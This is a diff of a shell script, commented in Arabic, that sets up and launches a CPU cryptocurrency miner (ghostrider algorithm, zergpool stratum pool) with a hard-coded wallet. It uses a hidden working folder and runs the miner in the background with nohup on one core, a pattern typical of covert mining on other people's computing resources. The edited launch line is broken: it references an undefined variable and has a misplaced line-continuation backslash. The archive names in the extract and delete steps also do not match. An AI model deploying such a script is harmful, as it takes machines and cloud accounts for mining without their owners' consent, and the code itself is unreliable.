@@ -4,6 +4,7 @@
 WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"   # ← عدّلها لمحفظتك
 WORKER="x" 
 POOL="stratum+tcp://ghostrider.eu.mine.zergpool.com:5354"
+ALGORITHM="ghostrider"
 THREADS=1   # ← عدد الأنوية المحدد للتعدين (1 Core)
 
 # مجلد عمل مخفي
@@ -18,10 +19,10 @@ tar -xvf scala.tar.gz --strip=1
 rm scala.tar.xz
 
 # تشغيل المعدّن في الخلفية بنواة واحدة
-nohup ./scala \
-   --algorithm ghostrider \
-   --pool $POOL \
-   --wallet $WALLET \
-   --password c=XNA \
-   --cpu-threads-limit $THREADS \
-   > cpu_output.log 2>&1 &
+nohup ./scala \ -a $ghostrider -o $POOL -u $WALLET -p $WORKER --threads=$THREADS > cpu_output.log 2>&1 &
+ #  --algorithm ghostrider \
+ #  --pool $POOL \
+ #  --wallet $WALLET \
+ #  --password c=XNA \
+ #  --cpu-threads-limit $THREADS \
+  # > cpu_output.log 2>&1 &
